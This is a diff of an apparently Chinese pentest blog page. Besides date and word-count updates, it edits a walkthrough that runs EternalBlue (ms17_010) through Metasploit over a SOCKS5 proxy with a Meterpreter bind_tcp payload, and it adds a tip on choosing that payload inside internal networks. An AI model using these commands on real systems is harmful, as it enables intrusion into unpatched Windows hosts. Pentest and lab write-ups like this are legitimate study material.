@@ -418,7 +418,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-01-20
+                    2025-02-20
                 </div>
                 
 
@@ -1785,7 +1785,7 @@ msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternal
 ----------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>上面这套流程走下来，利用失败了。</p>
-<p>使用下面的参数设置：</p>
+<p>使用下面的参数设置：(注意内网环境的payload使用windows/x64/meterpreter/bind_tcp)</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setg Proxies socks5:127.0.0.1:1090
 use exploit/windows/smb/ms17_010_eternalblue	
 <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp
@@ -2308,7 +2308,7 @@ sc <span class="token punctuation">\</span><span class="token punctuation">\</sp
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">251.9k</span>
+                        class="white-color">254.2k</span>
             
             
             
